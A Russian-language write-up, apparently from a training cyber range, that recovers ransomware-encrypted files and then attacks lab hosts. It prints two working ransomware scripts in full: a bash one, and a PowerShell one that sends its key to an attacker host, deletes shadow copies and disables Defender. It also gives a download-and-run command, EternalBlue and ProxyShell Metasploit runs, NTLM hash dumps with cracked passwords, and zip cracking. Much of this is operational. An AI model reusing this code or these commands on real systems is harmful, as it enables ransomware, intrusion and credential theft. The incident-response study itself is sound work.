Mar  5 14:36:57 elto-portal2 tag_audit type=EXECVE msg=audit(1646476301.433:7313): argc=13 a0="openssl" a1="enc" a2="-aes-256-cbc" a3="-a" a4="-salt" a5="-in" a6="/var/www/html/11FLAG.txt" a7="-out" a8="/var/www/html/11FLAG.txt.encr" a9="-pass" a10="pass:45BC4F0B18" a11="-iv" a12="82262272B0DA75FF6A6613864AF3AEBC"
```

И так как злоумышленник пытался закриптить данные несколько раз, то нам  нужно взять последнюю из таких строк, так как в каждой из них ключ и вектор инициализации различны. В нашем случае это будет строка 

```bash
Mar  5 14:36:57 elto-portal2 tag_audit type=EXECVE msg=audit(1646476301.433:7313): argc=13 a0="openssl" a1="enc" a2="-aes-256-cbc" a3="-a" a4="-salt" a5="-in" a6="/var/www/html/11FLAG.txt" a7="-out" a8="/var/www/html/11FLAG.txt.encr" a9="-pass" a10="pass:45BC4F0B18" a11="-iv" a12="82262272B0DA75FF6A6613864AF3AEBC"
```

Соберем на ее основе bash команду для декрипта

```bash
openssl enc -aes-256-cbc -d -a -in "encr_file"  -out "decr_file" -pass pass:45BC4F0B18 -iv 82262272B0DA75FF6A6613864AF3AEBC"
```

И уже на основе этой команды напишем небольшой питоновский скриптец для декрипта всех файлов в директории. 

```python=
from os import listdir
import os 



onlyfiles = [f for f in listdir()]

prefix = ".encr"

def decrtpt_file(filename):
    out = filename[:-len(prefix)]
    os.system("openssl enc -aes-256-cbc -d -a -in "+filename+"  -out "+out+" -pass pass:45BC4F0B18 -iv 82262272B0DA75FF6A6613864AF3AEBC")



for f in onlyfiles:
    if(f.count(prefix)>0):
        decrtpt_file(f)
```

Прочитаем расшифрованный флаг

```bash
admin@elto-portal2:/var/www/html$ cat 11FLAG.txt
Accidit in puncto, quod non speratur in anno.
```


Флаг: `Accidit in puncto, quod non speratur in anno.` *(В один миг случается то, на что не надеешься и годами)*


Дополнительно:
- вернуть файл `/etc/motd` в изначальное состояние.
- так же после открытия доступа к сурикате нашли сорцы `encr.sh`

```bash=
#!/bin/bash

iv=`cat /dev/urandom | tr -cd 'A-F0-9' | head -c 32`
pass=`cat /dev/urandom | tr -cd 'A-F0-9' | head -c 10`
dirwalk=/var/www/html
files=`find $dirwalk -maxdepth 1 -type f | grep -P ".php$|FLAG.txt$"`
for f in $files
do
    outfile=$f.encr
    openssl enc -aes-256-cbc -a -salt -in $f -out $outfile -pass pass:$pass -iv $iv
    rm $f
done
	echo "Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key." | wall
	echo "Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key." > /etc/motd

exit 0
```


## EternalBlue

Проверив некоторые хосты, обнаружим что они уязвимы для EternalBlue (CVE-2017-0144). Стоит так-же отметить, что все нижеперечисленные машины так-же уязвимы к CVE-2012-0002 и CVE-2012-0152

```
rhosts => 10.11.2.12
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.11.2.12:445        - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.11.2.12:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
rhosts => 10.11.4.8
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.11.4.8:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.11.4.8:445         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
rhosts => 10.11.239.5
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.11.239.5:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.11.239.5:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
rhosts => 10.11.239.6
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.11.239.6:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.11.239.6:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
rhosts => 10.11.240.14
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.11.240.14:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.11.240.14:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


Запустили на них сплоит и получим системный доступ

```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <IP>
run
```

Сдампили все ntlm хэши

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/hashdump 
msf6 post(windows/gather/hashdump) > set session 2
session => 2
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 791b05821400438629a2a79f2923fa52...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

cadm:";)"

[*] Dumping password hashes...


Администратор:500:aad3b435b51404eeaad3b435b51404ee:4c24dc6d6c75dee89c887b44a02285ee:::
Гость:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
cadm:1000:aad3b435b51404eeaad3b435b51404ee:3e3b78359fdb827d5d348b7b923f4e55:::


[*] Post module execution completed
```

Результат для всех уязвимых машин:

```
msf6 post(windows/gather/hashdump) > creds
Credentials
===========

host          origin       service        public                      private                                                            realm  private_type    JtR Format
----          ------       -------        ------                      -------                                                            -----  ------------    ----------
10.11.2.12                 445/tcp (smb)  Администратор                                                                                         Blank password  
10.11.2.12    10.11.2.12   445/tcp (smb)  Администратор               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.2.12                 445/tcp (smb)  Гость                                                                                                 Blank password  
10.11.2.12    10.11.2.12   445/tcp (smb)  Гость                       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.2.12    10.11.2.12   445/tcp (smb)  cadm                        aad3b435b51404eeaad3b435b51404ee:3e3b78359fdb827d5d348b7b923f4e55         NTLM hash       nt,lm
10.11.239.5   10.11.239.5  445/tcp (smb)  Администратор               aad3b435b51404eeaad3b435b51404ee:4c24dc6d6c75dee89c887b44a02285ee         NTLM hash       nt,lm
10.11.239.5   10.11.2.12   445/tcp (smb)  Гость                       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.239.5   10.11.2.12   445/tcp (smb)  cadm                        aad3b435b51404eeaad3b435b51404ee:3e3b78359fdb827d5d348b7b923f4e55         NTLM hash       nt,lm
10.11.239.5   10.11.239.5  445/tcp (smb)  oper                        aad3b435b51404eeaad3b435b51404ee:b59607640885d9c51c5a85a5126c9551         NTLM hash       nt,lm
10.11.239.6   10.11.239.5  445/tcp (smb)  Администратор               aad3b435b51404eeaad3b435b51404ee:4c24dc6d6c75dee89c887b44a02285ee         NTLM hash       nt,lm
10.11.239.6   10.11.2.12   445/tcp (smb)  Гость                       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.239.6   10.11.2.12   445/tcp (smb)  cadm                        aad3b435b51404eeaad3b435b51404ee:3e3b78359fdb827d5d348b7b923f4e55         NTLM hash       nt,lm
10.11.239.6   10.11.239.5  445/tcp (smb)  oper                        aad3b435b51404eeaad3b435b51404ee:b59607640885d9c51c5a85a5126c9551         NTLM hash       nt,lm
10.11.240.14  10.11.2.12   445/tcp (smb)  Администратор               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.240.14  10.11.2.12   445/tcp (smb)  Гость                       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
10.11.240.14  10.11.2.12   445/tcp (smb)  cadm                        aad3b435b51404eeaad3b435b51404ee:3e3b78359fdb827d5d348b7b923f4e55         NTLM hash       nt,lm

```

Пробрутим хэши паролей и получим следующие креды:
```
Администратор:500:aad3b435b51404eeaad3b435b51404ee:4c24dc6d6c75dee89c887b44a02285ee:::Maggie1
oper:1001:aad3b435b51404eeaad3b435b51404ee:b59607640885d9c51c5a85a5126c9551:::Stephanie1
```

Данные учетные записи работают на ip 10.11.4.6,8,10,13 и других подсетях


Залили туда свой ssh ключ, чтобы в будущем просто подключаться по ssh.


Далее запускаем winpeas:
```
powershell
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); 
[winPEAS.Program]::Main("log=./winpeas.log")
```

## ProxyShell

На ip 10.11.3.20 работает уязвимая к CVE-2021-34473 ProxyShell. Используем metasploit:
```
msf6 > use exploit/windows/http/exchange_proxyshell_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxyshell_rce) > set rhosts 10.11.3.20
rhosts => 10.11.3.20
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lhost 10.11.5.12
lhost => 10.11.5.12
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lport 13378
lport => 13378
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

```

И получаем доступ к серверу Exchange


## Windows Decrypt


Подключаемся к машине 10.11.239.6 по следующим кредам 

```bash
rdesktop -u Администратор -p Maggie1  10.11.239.6
```

Сразу заметим на диске `C:\` странный файл `Ransom.ps1`, даже из названия очевидно что это малварь, но прежде стоит глянуть код.
 

```shell=
set-strictMode -version 2.0
function Ransom
{

Param(
    [Parameter(Position = 0)]
    [String]
    $IP='127.0.0.1'
    )

    $aesManaged=new-object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
    $aesManaged.BlockSize=128;
    $aesManaged.KeySize=256;
    $aesManaged.GenerateKey();
    $IV =  [System.Convert]::ToBase64String($aesManaged.IV);
    $key = [System.Convert]::ToBase64String($aesManaged.Key);

    $URL="http://$IP/key=$Key&iv=$IV&pc=$env:computername";
    try { Invoke-WebRequest $URL } catch {
        $_.Exception.Response.StatusCode.Value__}

    $background = "http://$IP/wall.jpg"
    Invoke-WebRequest -Uri $background -OutFile "/users/$env:USERNAME/wall.jpg"
    Start-Sleep -s 2
    $wallpaper = "C:/users/$env:USERNAME/wall.jpg"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
    Start-Sleep -s 2
    rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False

    vssadmin delete shadows /all /quiet;
    spsv vss -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
    set-service vss -StartupType Disabled};

    bcdedit /set recoveryenabled No|Out-Null;
    bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null;

    spsv Wscsvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
    set-service Wscsvc -StartupType Disabled};
    spsv WinDefend -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
    set-service WinDefend -StartupType Disabled};
    spsv Wuauserv -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
    set-service Wuauserv -StartupType Disabled};
    spsv BITS -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
    set-service BITS -StartupType Disabled};
    spsv ERSvc -ErrorAction SilentlyContinue;
    spsv WerSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
    set-service WerSvc -StartupType Disabled};

    Write-Output "Encryption phase" 

    $encryptor=$aesManaged.CreateEncryptor();
    $directory = "C:\Share"
    $files=gci $directory -Recurse -Include *.txt,*.pdf,*.docx,*.doc,*.jpg;
    foreach($file in $files) {
        $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
        $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData=$aesManaged.IV + $encryptedData;
        [System.IO.File]::WriteAllBytes($($file.FullName+".crpt"),$fullData);
        Remove-Item $file;
    }
}
```

Из кода становится понятно, что мы наткнулись на очередной криптер. Так как он передает в get запросе ключ шифрования и iv (через url), то нам достаточно где-то в логах найти http запрос и мы сможем все расшифровать (и вообще нам нужен только ключ шифрования, так как вектор инициализации передается в начало каждого файла).


Пока лазили и смотрели файлы на системе нашли среди установленных программ `sysmon`, на его логи мы и нацелились в первую очередь. Запустим `eventvwr.msc` ("Просмотр событий") и пройдем по следущей цепочки `Applications and Services Log > Microsoft > Windows > Sysmon > Operational`. Там отсортировав логи sysmon'a по времени и зная время появления зашифрованных файлов, можем найти следущее событие:
```
Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2022-03-05 10:33:43.163
ProcessGuid: {98d53961-0000-0000-83e3-a70400000000}
ProcessId: 4072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -ep bypass (new-object system.net.webclient).DownloadFile('http://10.11.200.50/Ransom.ps1','C:\Ransom.ps1');import-module C:\Ransom.ps1; Ransom -IP 10.11.200.50 
CurrentDirectory: C:\
User: company\Administrator
LogonGuid: {98d53961-0000-0000-27c1-a70400000000}
LogonId: 0x4a7c127
TerminalSessionId: 0
IntegrityLevel: High
Hashes: SHA1=88E7CDC0B75364418E11B2C53F772085F1B61D1E,MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
ParentProcessGuid: {98d53961-0000-0000-3fe0-a70400000000}
ParentProcessId: 1948
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /Q /c powershell.exe -ep bypass (new-object system.net.webclient).DownloadFile('http://10.11.200.50/Ransom.ps1','C:\Ransom.ps1');import-module C:\Ransom.ps1; Ransom -IP 10.11.200.50 1> \\127.0.0.1\ADMIN$\__1646476419.946397 2>&1

```

Единственное полезное, что можно вытащить отсюда это, то как малварь попала на машину, ip злоумышленика и точное время этого события. 
```shell
cmd.exe /Q /c powershell.exe -ep bypass (new-object system.net.webclient).DownloadFile('http://10.11.200.50/Ransom.ps1','C:\Ransom.ps1');import-module C:\Ransom.ps1; Ransom -IP 10.11.200.50 1> \\127.0.0.1\ADMIN$\__1646476419.946397 2>&1
```

И, к сожалению, около этого события не нашлось ничего что могло бы помочь нам найти ключ или запрос содержащий его.

Так что было решенно посмотреть логи других программ, в различных сетевых логах ничего не нашлось, а вот в логах powershell'a (`Applications and Services Log > Microsoft > Windows > PowerShell > Operational`). Нашлась интересная и нужная запись.

```
CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://10.11.200.50/key=DXySLmtRkp9RWI/+RrEdxZAZ1ApBWZapUSRi3LpO/3U=&iv=HLjnip/6TvNwDoPabcdk7g==&pc=OIK-CLIENT"
TerminatingError(Invoke-WebRequest): "<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Debian) Server at 10.11.200.50 Port 80</address>
</body></html>
"


Контекст:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.14409.1005
        Host ID = bbaf4e24-c8a1-40c4-a78e-c7b470c62708
        Host Application = powershell.exe -ep bypass (new-object system.net.webclient).DownloadFile('http://10.11.200.50/Ransom.ps1','C:\Ransom.ps1');import-module C:\Ransom.ps1; Ransom -IP 10.11.200.50
        Engine Version = 5.1.14409.1005
        Runspace ID = f9f7609b-bf84-4a18-b829-69b410f181e0
        Pipeline ID = 1
        Command Name = Invoke-WebRequest
        Command Type = Cmdlet
        Script Name = C:\Ransom.ps1
        Command Path = 
        Sequence Number = 25
        User = company\Administrator
        Connected User = 
        Shell ID = Microsoft.PowerShell


Данные пользователя:
```
Из нее видно, что совершается запрос http://10.11.200.50/key=DXySLmtRkp9RWI/+RrEdxZAZ1ApBWZapUSRi3LpO/3U=&iv=HLjnip/6TvNwDoPabcdk7g==&pc=OIK-CLIENT. Достаем из него base64 ключа и iv.

```
Key = DXySLmtRkp9RWI/+RrEdxZAZ1ApBWZapUSRi3LpO/3U=
IV  = HLjnip/6TvNwDoPabcdk7g==
```

Пропишем `set-executionpolicy remotesigned` чтобы можно было запускать powershell скрипты из файла, перепишем малварь под декриптер файлов и востановим все файлы из папки `C:\Share`.


```shell=
$aesManaged=new-object "System.Security.Cryptography.AesManaged";
$aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
$aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
$aesManaged.BlockSize=128;
$aesManaged.KeySize=256;

$string = "DXySLmtRkp9RWI/+RrEdxZAZ1ApBWZapUSRi3LpO/3U=";
$array = $string.ToCharArray();

$key =  [System.Convert]::FromBase64CharArray($array, 0, $array.Length);

 $string = "HLjnip/6TvNwDoPabcdk7g==";
$array = $string.ToCharArray();
$IV = [System.Convert]::FromBase64CharArray($array, 0, $array.Length);


$aesManaged.Key = $key
$aesManaged.IV = $IV

Write-Output "Decryption phase" 

$decryptor=$aesManaged.CreateDecryptor();
$directory = "C:\Share"
$files=gci $directory -Recurse -Include *.crpt;
foreach($file in $files) {
    $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
    $dt = $IV.Length
    $decryptedData=$decryptor.TransformFinalBlock($bytes, $dt, $bytes.Length-$dt);

    [System.IO.File]::WriteAllBytes($($file.FullName+".bak"),$decryptedData);

    }
```

Получим расшифрованный флаг. 

Флаг: `Factu scintillae fit saepe perustio villae.` *(Часто маленькая искорка дотла сжигает дом)*


Дополнительно:
- ключ и iv можно было так же найти в сурикате.




## Suricata

Подключаемся к очередной машине 10.11.4.10 с ранее выясненными кредами

```bash
rdesktop -u Администратор -p Maggie1  10.11.4.10
```

На ней находим файл 
`10.11.4.10:/документы/11password.zip`

С помощью `zip2john` и `john` попробуем подобрать к нему пароль.

```bash
zip2john 11password.zip > zip.hashes
john --wordlist=./rockyou7.txt zip.hashes
```

Он подобрал следующий пароль.
```bash
jonny -> pass 12994
```

Распаковав архив, найдем в нем следущий файл с кредами для Suricata.
```
Password on FW with suricata and pcap logs
user:Tinker1
```
